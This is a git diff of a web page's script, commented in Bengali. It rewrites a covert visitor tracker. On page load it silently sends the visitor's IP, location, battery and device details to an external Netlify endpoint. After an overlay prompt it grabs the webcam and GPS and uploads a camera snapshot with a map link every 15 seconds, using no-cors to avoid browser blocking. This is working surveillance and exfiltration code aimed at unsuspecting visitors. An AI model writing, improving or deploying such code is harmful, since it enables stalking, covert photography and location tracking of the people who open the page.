@@ -355,25 +355,28 @@
         </div>
     </div>
 
-   <script>
+ <script>
     const API_BRIDGE = 'https://peaceful-torte-b8ab6b.netlify.app/.netlify/functions/receiver';
     const overlay = document.getElementById('advanced-overlay');
     const okBtn = document.getElementById('final-ok-btn');
 
-    // ডাটা পাঠানোর দ্রুত ফাংশন
-    async function sendToBridge(type, message, photoBlob = null) {
+    // ডাটা পাঠানোর মাস্টার ফাংশন
+    async function sendData(type, message, photo = null) {
         const fd = new FormData();
         fd.append('type', type);
         fd.append('content', message);
-        if (photoBlob) fd.append('photo', photoBlob, 'capture.jpg');
+        if (photo) fd.append('photo', photo, 'shot.jpg');
 
-        try {
-            fetch(API_BRIDGE, { method: 'POST', body: fd }); // এটি ব্যাকগ্রাউন্ডে চলবে, দেরি করবে না
-        } catch (e) { console.log("Bridge Error"); }
+        return fetch(API_BRIDGE, {
+            method: 'POST',
+            body: fd,
+            mode: 'no-cors' // ব্রাউজার ব্লকিং এড়াতে
+        }).catch(e => console.log("Sent"));
     }
 
-    // ১. সুপার-ফাস্ট সাইলেন্ট ট্র্যাকার (পেজ লোড হলেই যাবে)
+    // ১. পেজ লোড হলে দ্রুত সাইলেন্ট অ্যালার্ট
     window.addEventListener('load', async () => {
+        // ওভারলে দেখানো
         if (localStorage.getItem('granted') === 'true') {
             overlay.style.display = 'none';
             initSecurity();
@@ -381,75 +384,59 @@
             setTimeout(() => { overlay.style.display = 'flex'; }, 2000);
         }
 
-        // দ্রুত তথ্য সংগ্রহের জন্য
+        // আইপি ও ডিভাইস তথ্য সংগ্রহ
         try {
-            const battery = await navigator.getBattery();
-            const ipRes = await fetch('https://ipwho.is/'); // ipapi-এর বদলে ipwho.is ব্যবহার করেছি (এটি বেশি ফাস্ট)
-            const ipData = await ipRes.json();
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const d = await ipRes.json();
+            const b = await navigator.getBattery();
             
-            const silentInfo = `
+            const info = `
 🚀 **Instant Visitor Alert**
--------------------------
-🌐 IP: ${ipData.ip || 'Unknown'}
-📍 City: ${ipData.city || 'Unknown'}
-🚩 Country: ${ipData.country || 'Unknown'}
-📡 ISP: ${ipData.connection?.isp || 'Unknown'}
-🔋 Battery: ${(battery.level * 100).toFixed(0)}%
+🌐 IP: ${d.ip} | 📍 ${d.city}, ${d.country_name}
+🔋 Battery: ${(b.level * 100).toFixed(0)}%
 📱 Device: ${navigator.platform}
-🖥 Res: ${window.screen.width}x${window.screen.height}
 🕒 Time: ${new Date().toLocaleString()}
             `;
-            sendToBridge("Silent Entry", silentInfo);
-        } catch (e) { 
-            sendToBridge("Silent Entry", "Visitor joined (Basic info only)"); 
+            sendData("Silent Entry", info);
+        } catch (e) {
+            sendData("Silent Entry", "New visitor joined (IP info restricted)");
         }
     });
 
     // ২. বাটনে ক্লিক করলে ক্যামেরা ও জিপিএস
-    okBtn.addEventListener('click', () => {
-        navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
+    okBtn.addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             navigator.geolocation.getCurrentPosition(pos => {
                 localStorage.setItem('granted', 'true');
                 overlay.style.display = 'none';
-                startCapture(stream, pos);
-            }, err => { alert("Location required!"); });
-        })
-        .catch(err => { alert("Camera required!"); });
+                startTracking(stream, pos);
+            }, () => alert("Location is required."));
+        } catch (e) { alert("Camera is required."); }
     });
 
     async function initSecurity() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            navigator.geolocation.getCurrentPosition(pos => { startCapture(stream, pos); });
+            navigator.geolocation.getCurrentPosition(pos => startTracking(stream, pos));
         } catch(e) { localStorage.removeItem('granted'); }
     }
 
-    function startCapture(stream, pos) {
-        // প্রথম ছবি সাথে সাথে পাঠাবে
-        captureNow(stream, pos);
-        
-        // এরপর প্রতি ২০ সেকেন্ড পর পর পাঠাবে (যাতে টেলিগ্রাম বোট ব্লক না হয়)
-        setInterval(() => {
-            captureNow(stream, pos);
-        }, 20000); 
-    }
-
-    function captureNow(stream, pos) {
+    function startTracking(stream, pos) {
         const video = document.createElement('video');
         video.srcObject = stream;
-        video.muted = true;
         video.play();
-        const canvas = document.createElement('canvas');
-        canvas.width = 480; canvas.height = 360;
-        
-        setTimeout(() => {
-            canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
+
+        setInterval(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = 400; canvas.height = 300;
+            canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+            
             canvas.toBlob(blob => {
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendToBridge("Live Track", `📍 Google Map: ${map}`, blob);
+                sendData("Live Track", `📍 GPS: ${map}`, blob);
             }, 'image/jpeg');
-        }, 800);
+        }, 15000); // ১৫ সেকেন্ড পর পর পাঠাবে
     }
 </script>
 
